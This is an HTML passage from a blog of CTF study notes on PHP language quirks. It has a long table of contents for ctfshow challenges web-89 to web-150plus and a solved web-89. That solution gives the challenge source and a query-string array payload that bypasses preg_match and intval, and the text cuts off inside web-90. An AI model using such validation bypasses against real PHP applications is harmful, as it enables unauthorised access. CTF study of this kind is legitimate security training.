            <span class="post-date" title="2024-12-29 19:30:51">2024/12/29</span>
        </a>
        
        
        <a  class="All "
           href="/2024/12/28/php%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E7%AC%94%E8%AE%B0/"
           data-tag="学习笔记,正则表达式"
           data-author="" >
            <span class="post-title" title="正则表达式笔记">正则表达式笔记</span>
            <span class="post-date" title="2024-12-28 20:46:55">2024/12/28</span>
        </a>
        
        
        <a  class="All "
           href="/2024/12/26/PHP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"
           data-tag="学习笔记,php"
           data-author="" >
            <span class="post-title" title="PHP学习笔记">PHP学习笔记</span>
            <span class="post-date" title="2024-12-26 23:50:15">2024/12/26</span>
        </a>
        
        
        <a  class="All "
           href="/2024/12/25/HTML%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"
           data-tag="学习笔记,HTML"
           data-author="" >
            <span class="post-title" title="HTML学习笔记">HTML学习笔记</span>
            <span class="post-date" title="2024-12-25 23:54:00">2024/12/25</span>
        </a>
        
        
        <a  class="All "
           href="/2024/12/25/welcome/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="welcome">welcome</span>
            <span class="post-date" title="2024-12-25 20:38:33">2024/12/25</span>
        </a>
        
        <div id="no-item-tips">

        </div>
    </nav>
    <div id="outline-list">
    </div>
</div>

    </div>
    <div class="hide-list">
        <div class="semicircle" data-title="Toggle full screen shortcut key s">
            <div class="brackets first"><</div>
            <div class="brackets">&gt;</div>
        </div>
    </div>
</aside>
<div id="post">
    <div class="pjax">
        <article id="post-ctfshow-php特性" class="article article-type-post" itemscope itemprop="blogPost">
    
        <h1 class="article-title">ctfshow-php特性</h1>
    
    <div class="article-meta">
        
        
        
        
        <span class="tag">
            <i class="iconfont icon-tag"></i>
            
            <a class="color1">php特性</a>
            
            <a class="color5">学习笔记</a>
            
        </span>
        
    </div>
    <div class="article-meta">
        
            Created At : <time class="date" title='Updated At: 2025-03-16 21:52:38'>2025-02-24 18:53</time>
        
    </div>
    <div class="article-meta">
        
        <span>Count:18.2k</span>
        
        
        <span id="busuanzi_container_page_pv">
            Views 👀 :<span id="busuanzi_value_page_pv">
                <span class="count-comment">
                    <span class="spinner">
                      <div class="cube1"></div>
                      <div class="cube2"></div>
                    </span>
                </span>
            </span>
        </span>
        
        
        <span class="top-comment" title="Jump to comment area">
            <a href="#comments">
                Comment:<span class="count-comment">
                    <span class="spinner">
                      <div class="cube1"></div>
                      <div class="cube2"></div>
                    </span>
                </span>
            </a>
        </span>
        
    </div>
    
    <div class="toc-ref">
    
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#web-php%E7%89%B9%E6%80%A7"><span class="toc-text">web-php特性</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web-89%EF%BC%88preg-match%E3%80%81intval%EF%BC%89"><span class="toc-text">web-89（preg_match、intval）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#preg-match"><span class="toc-text">preg_match()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#intval"><span class="toc-text">intval()</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-90%EF%BC%88intval%EF%BC%89"><span class="toc-text">web-90（intval）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%BA%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83"><span class="toc-text">强类型比较</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-91%EF%BC%88%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D%E5%A4%9A%E8%A1%8C%E6%A8%A1%E5%BC%8F%EF%BC%89"><span class="toc-text">web-91（正则匹配多行模式）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D%E6%A8%A1%E5%BC%8F"><span class="toc-text">正则匹配模式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-92%EF%BC%88intval%EF%BC%89"><span class="toc-text">web-92（intval）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83"><span class="toc-text">弱类型比较</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-93%EF%BC%88intval%EF%BC%89"><span class="toc-text">web-93（intval）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-94%EF%BC%88intval%EF%BC%89"><span class="toc-text">web-94（intval）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#strpos"><span class="toc-text">strpos()</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-95%EF%BC%88intval%EF%BC%89"><span class="toc-text">web-95（intval）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-96%EF%BC%88%E6%8C%89%E8%B7%AF%E5%BE%84%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%EF%BC%89"><span class="toc-text">web-96（按路径读取文件）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#highlight-file"><span class="toc-text">highlight_file()</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-97%EF%BC%88md5%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E%EF%BC%89"><span class="toc-text">web-97（md5函数漏洞）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#md5-%E5%8A%A0%E5%AF%86%E5%87%BD%E6%95%B0"><span class="toc-text">md5()加密函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-98%EF%BC%88%E5%AE%A1%E8%AE%A1%E3%80%81%E4%BC%A0%E5%8F%82%E3%80%81%E5%BC%95%E7%94%A8%EF%BC%89"><span class="toc-text">web-98（审计、传参、引用）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%95%E7%94%A8"><span class="toc-text">引用</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web-99%EF%BC%88%E5%AE%A1%E8%AE%A1%E3%80%81in-array%E3%80%81file-put-contents%EF%BC%89"><span class="toc-text">web-99（审计、in_array、file_put_contents）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#in-array"><span class="toc-text">in_array()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#file-put-contents"><span class="toc-text">file_put_contents()</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-100%EF%BC%88%E9%80%BB%E8%BE%91%E8%BF%90%E7%AE%97%E7%AC%A6%E4%BC%98%E5%85%88%E7%BA%A7%E3%80%81is-numeric%EF%BC%89"><span class="toc-text">web-100（逻辑运算符优先级、is_numeric）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%BB%E8%BE%91%E8%BF%90%E7%AE%97%E7%AC%A6%E4%BC%98%E5%85%88%E7%BA%A7"><span class="toc-text">逻辑运算符优先级</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#is-numeric"><span class="toc-text">is_numeric()</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-101%EF%BC%88ReflectionClass%E5%8F%8D%E5%B0%84%E7%B1%BB%EF%BC%89"><span class="toc-text">web-101（ReflectionClass反射类）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ReflectionClass%E5%8F%8D%E5%B0%84%E7%B1%BB"><span class="toc-text">ReflectionClass反射类</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-102%EF%BC%88php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E3%80%81hex2bin%E3%80%81substr%E3%80%81call-user-func%EF%BC%89"><span class="toc-text">web-102（php伪协议、hex2bin、substr、call_user_func）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#call-user-func"><span class="toc-text">call_user_func()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#substr"><span class="toc-text">substr()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hex2bin"><span class="toc-text">hex2bin()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-text">php伪协议</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-103%EF%BC%88%E5%90%8C%E4%B8%8A%E9%A2%98%EF%BC%89"><span class="toc-text">web-103（同上题）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-104%EF%BC%88sha1%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87%EF%BC%89"><span class="toc-text">web-104（sha1数组绕过）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sha1"><span class="toc-text">sha1()</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-105%EF%BC%88%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E3%80%81die%EF%BC%89"><span class="toc-text">web-105（变量覆盖、die）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96"><span class="toc-text">变量覆盖</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#die"><span class="toc-text">die()</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-106%EF%BC%88sha1%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87%EF%BC%89"><span class="toc-text">web-106（sha1数组绕过）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-107%EF%BC%88parse-str-%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%EF%BC%89"><span class="toc-text">web-107（parse_str()变量覆盖）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#parse-str"><span class="toc-text">parse_str()</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-108%EF%BC%88ereg-%E3%80%81-00%E6%88%AA%E6%96%AD%EF%BC%89"><span class="toc-text">web-108（ereg()、%00截断）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ereg"><span class="toc-text">ereg()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#strrev"><span class="toc-text">strrev()</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-109%EF%BC%88-toString-%E6%96%B9%E6%B3%95%E3%80%81%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8%EF%BC%8C%E5%BC%82%E5%B8%B8%E7%B1%BB%E5%92%8C%E5%8F%8D%E5%B0%84%E7%B1%BB%EF%BC%89"><span class="toc-text">web-109（__toString()方法、原生类利用，异常类和反射类）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP%E5%8E%9F%E7%94%9F%E7%B1%BB"><span class="toc-text">PHP原生类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#toString-%E6%96%B9%E6%B3%95"><span class="toc-text">__toString()方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-110%EF%BC%88-toString-%E6%96%B9%E6%B3%95%E3%80%81FilesystemIterator%E7%B1%BB%E5%88%A9%E7%94%A8%EF%BC%89"><span class="toc-text">web-110（__toString()方法、FilesystemIterator类利用）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-111%EF%BC%88%E8%B6%85%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F-GLOBALS%EF%BC%89"><span class="toc-text">web-111（超全局变量$GLOBALS）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B6%85%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F"><span class="toc-text">超全局变量</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-112%EF%BC%88is-file-%E3%80%81php%E4%BC%AA%E5%8D%8F%E8%AE%AE-filter-%EF%BC%89"><span class="toc-text">web-112（is_file()、php伪协议(filter)）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#php%E4%BC%AA%E5%8D%8F%E8%AE%AE%EF%BC%88filter%EF%BC%89"><span class="toc-text">php伪协议（filter）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-113%EF%BC%88is-file%E3%80%81php%E4%BC%AA%E5%8D%8F%E8%AE%AE-zlib-%EF%BC%89"><span class="toc-text">web-113（is_file、php伪协议(zlib)）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-114%EF%BC%88is-file%E3%80%81php%E4%BC%AA%E5%8D%8F%E8%AE%AE-filter-%EF%BC%89"><span class="toc-text">web-114（is_file、php伪协议(filter)）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-115%EF%BC%88is-numeric-%E3%80%81trim-%EF%BC%89"><span class="toc-text">web-115（is_numeric()、trim()）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#trim"><span class="toc-text">trim()</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-123%EF%BC%88GET-POST%E4%BC%A0%E9%80%92%E5%8F%98%E9%87%8F%E7%89%B9%E6%80%A7%EF%BC%88-%EF%BC%89%EF%BC%89"><span class="toc-text">web-123（GET&#x2F;POST传递变量特性（[））</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#GET-POST%E4%BC%A0%E9%80%92%E5%8F%98%E9%87%8F%E7%89%B9%E6%80%A7%EF%BC%88-%EF%BC%89"><span class="toc-text">GET&#x2F;POST传递变量特性（[）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SERVER"><span class="toc-text">$_SERVER</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-124%EF%BC%88highlight-file%E3%80%81-%E3%80%81get%E4%BC%A0%E5%8F%82%E3%80%81arg%EF%BC%89"><span class="toc-text">web-124（highlight_file、[、get传参、arg）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-126%EF%BC%88assert%E3%80%81arg%EF%BC%89"><span class="toc-text">web-126（assert、arg）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#assert"><span class="toc-text">assert()</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-127%EF%BC%88extract-%E3%80%81-SERVER-%E2%80%98QUERY-STRING%E2%80%99-%EF%BC%89"><span class="toc-text">web-127（extract()、$_SERVER[‘QUERY_STRING’]）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#extract"><span class="toc-text">extract()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SERVER-%E2%80%98QUERY-STRING%E2%80%99"><span class="toc-text">$_SERVER[‘QUERY_STRING’]</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-128%EF%BC%88gettext-%E3%80%81get-defined-vars-%EF%BC%89"><span class="toc-text">web-128（gettext()、get_defined_vars()）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#gettext"><span class="toc-text">gettext</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#get-defined-vars"><span class="toc-text">get_defined_vars()</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-129%EF%BC%88stripos-%E3%80%81php%E4%BC%AA%E5%8D%8F%E8%AE%AE-%E5%B5%8C%E5%A5%97%E6%97%A0%E6%95%88%E5%8D%8F%E8%AE%AE-%E3%80%81%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%EF%BC%89"><span class="toc-text">web-129（stripos()、php伪协议(嵌套无效协议)、目录穿越）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#stripos"><span class="toc-text">stripos()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#readfile"><span class="toc-text">readfile()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%B5%8C%E5%A5%97%E6%97%A0%E6%95%88%E5%8D%8F%E8%AE%AE"><span class="toc-text">php伪协议嵌套无效协议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A"><span class="toc-text">目录穿越</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-130%EF%BC%88%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87preg-match-stripos%E3%80%81%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D%EF%BC%89"><span class="toc-text">web-130（数组绕过preg_match&#x2F;stripos、正则匹配）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-131%EF%BC%88PCRE%E5%9B%9E%E6%BA%AF%E6%AC%A1%E6%95%B0%E7%BB%95%E8%BF%87preg-match%EF%BC%89"><span class="toc-text">web-131（PCRE回溯次数绕过preg_match）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PCRE%E5%9B%9E%E6%BA%AF%E6%AC%A1%E6%95%B0%E7%BB%95%E8%BF%87"><span class="toc-text">PCRE回溯次数绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-132%EF%BC%88%E9%80%BB%E8%BE%91%E8%BF%90%E7%AE%97%E7%AC%A6%E4%BC%98%E5%85%88%E7%BA%A7%EF%BC%89"><span class="toc-text">web-132（逻辑运算符优先级）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-133%EF%BC%88curl%E3%80%81%E6%97%A0%E5%9B%9E%E6%98%BE%E7%9A%84shell-exec%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E3%80%81DNSlog%E5%A4%96%E5%B8%A6%EF%BC%89"><span class="toc-text">web-133（curl、无回显的shell_exec命令执行、DNSlog外带）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-134%EF%BC%88-SERVER-%E2%80%98QUERY-STRING%E2%80%99-%E3%80%81parse-str%E3%80%81extract%EF%BC%89"><span class="toc-text">web-134（$_SERVER[‘QUERY_STRING’]、parse_str、extract）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-135%EF%BC%88nl%EF%BC%88linux%EF%BC%89%EF%BC%89"><span class="toc-text">web-135（nl（linux））</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-136%EF%BC%88tee%E3%80%81nl%E3%80%81exec-%EF%BC%89"><span class="toc-text">web-136（tee、nl、exec()）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#exec"><span class="toc-text">exec()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#tee%EF%BC%88linux%EF%BC%89"><span class="toc-text">tee（linux）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-137%EF%BC%88call-user-func%E8%B0%83%E7%94%A8%E7%B1%BB%E7%9A%84%E9%9D%99%E6%80%81%E6%96%B9%E6%B3%95%EF%BC%89"><span class="toc-text">web-137（call_user_func调用类的静态方法）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B1%BB%E7%9A%84%E9%9D%99%E6%80%81%E6%96%B9%E6%B3%95%E7%9A%84%E8%B0%83%E7%94%A8"><span class="toc-text">类的静态方法的调用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-138%EF%BC%88call-user-func%E6%95%B0%E7%BB%84%E8%B0%83%E7%94%A8%E9%9D%99%E6%80%81%E6%96%B9%E6%B3%95%EF%BC%89"><span class="toc-text">web-138（call_user_func数组调用静态方法）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#strripos"><span class="toc-text">strripos()</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-139"><span class="toc-text">web-139</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-140%EF%BC%88%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83%E3%80%81intval-%EF%BC%89"><span class="toc-text">web-140（弱类型比较、intval()）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-141%EF%BC%88%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%88%E5%8F%96%E5%8F%8D%E7%BB%95%E8%BF%87%EF%BC%89%EF%BC%89"><span class="toc-text">web-141（无字母数字命令执行（取反绕过））</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-text">无字母数字命令执行</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-142%EF%BC%88is-numeric%E3%80%81sleep%EF%BC%89"><span class="toc-text">web-142（is_numeric、sleep）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-143%EF%BC%88%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%88%E5%BC%82%E6%88%96%E7%BB%95%E8%BF%87%EF%BC%89%EF%BC%89"><span class="toc-text">web-143（无字母数字命令执行（异或绕过））</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-144%EF%BC%88%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%89"><span class="toc-text">web-144（无字母数字命令执行）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-145%EF%BC%88%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%88%E4%B8%89%E7%9B%AE%E8%BF%90%E7%AE%97%E7%AC%A6%EF%BC%89%EF%BC%89"><span class="toc-text">web-145（无字母数字命令执行（三目运算符））</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-146%EF%BC%88%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%88%E7%AD%89%E5%8F%B7-%E3%80%81%E4%BD%8D%E8%BF%90%E7%AE%97%E7%AC%A6-%EF%BC%89%EF%BC%89"><span class="toc-text">web-146（无字母数字命令执行（等号&#x3D;、位运算符||））</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-147%EF%BC%88create-function%E5%87%BD%E6%95%B0%EF%BC%89"><span class="toc-text">web-147（create_function函数）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#create-function%EF%BC%88%EF%BC%89"><span class="toc-text">create_function（）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-148%EF%BC%88%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%88%E5%BC%82%E6%88%96%E7%BB%95%E8%BF%87%EF%BC%89%EF%BC%89"><span class="toc-text">web-148（无字母数字命令执行（异或绕过））</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-149%EF%BC%88file-put-contents%EF%BC%89"><span class="toc-text">web-149（file_put_contents）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-150%EF%BC%88%E6%97%A5%E5%BF%97%E5%8C%85%E5%90%ABrce%EF%BC%89"><span class="toc-text">web-150（日志包含rce）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-150plus%EF%BC%88-autoload-%EF%BC%89"><span class="toc-text">web-150plus（__autoload()）</span></a></li></ol></li></ol>
    
<style>
    .left-col .switch-btn,
    .left-col .switch-area {
        display: none;
    }
    .toc-level-3 i,
    .toc-level-3 ol {
        display: none !important;
    }
</style>
</div>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="web-php特性"><a href="#web-php特性" class="headerlink" title="web-php特性"></a>web-php特性</h1><h2 id="web-89（preg-match、intval）"><a href="#web-89（preg-match、intval）" class="headerlink" title="web-89（preg_match、intval）"></a>web-89（preg_match、intval）</h2><p>源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[0-9]/&quot;</span>, <span class="hljs-variable">$num</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><strong>解题思路：</strong></p>
<p><strong>两步，绕过正则，且intval不为0。</strong></p>
<p><strong>所以可以采取传入数组的方式绕过：</strong></p>
<p><strong>preg_match()只能处理字符串，如果处理数组会返回false；intval如果传入数组，会返回1</strong></p>
<p>payload:</p>
<figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dart">?<span class="hljs-built_in">num</span>[]=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>

<hr>
<h3 id="preg-match"><a href="#preg-match" class="headerlink" title="preg_match()"></a>preg_match()</h3><p><a target="_blank" rel="noopener" href="https://www.runoob.com/php/php-preg_match.html">preg_match函数用法</a>，<a target="_blank" rel="noopener" href="https://www.runoob.com/regexp/regexp-tutorial.html">正则表达式语法</a>。</p>
<p><code>preg_match()</code>：执行正则表达式，进行字符串过滤。。<code>[0-9]</code>匹配0-9之间的所有字符。<code>/</code>相当于一个分隔符，<code>/../</code>之间的内容就是正则的语法。绕过方法：变量num为人工分配 ID 键的数值型数组，<code>preg_match()</code>就会失效。如<code>num[]=1,num[0]=1</code></p>
<h3 id="intval"><a href="#intval" class="headerlink" title="intval()"></a>intval()</h3><p><a target="_blank" rel="noopener" href="https://www.runoob.com/php/php-intval-function.html">intval函数用法</a></p>
<p><strong><code>intval()</code>：将变量的值默认转化为十进制。绕过方法：可以使用&#x3D;&#x3D;的特性，如+16、16.0；或者进制转换后，左右变量也相等。</strong>   </p>
<p><strong>int intval ( mixed $var [, int $base &#x3D; 10 ] )</strong></p>
<p><strong>参数说明：</strong><br>    <strong>$var：要转换成 integer 的数量值。</strong><br>    <strong>$base：转化所使用的进制。</strong><br><strong>如果 base 是 0，通过检测 var 的格式来决定使用的进制：</strong><br>    <strong>如果字符串包括了 “0x” (或 “0X”) 的前缀，使用 16 进制 (hex)；否则，</strong><br>    <strong>如果字符串以 “0” 开始，使用 8 进制(octal)；否则，</strong><br>    <strong>将使用 10 进制 (decimal)。</strong></p>
<ol>
<li><strong>使用array()类型的数组，<code>intval</code>遇到空数组为0，非空数组为1.</strong></li>
<li><strong>使用人工分配 ID 键的数值型数组，<code>intval</code>遇到空数组为0，非空数组为1。</strong></li>
</ol>
<hr>
<h2 id="web-90（intval）"><a href="#web-90（intval）" class="headerlink" title="web-90（intval）"></a>web-90（intval）</h2><p>源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span>===<span class="hljs-string">&quot;4476&quot;</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span 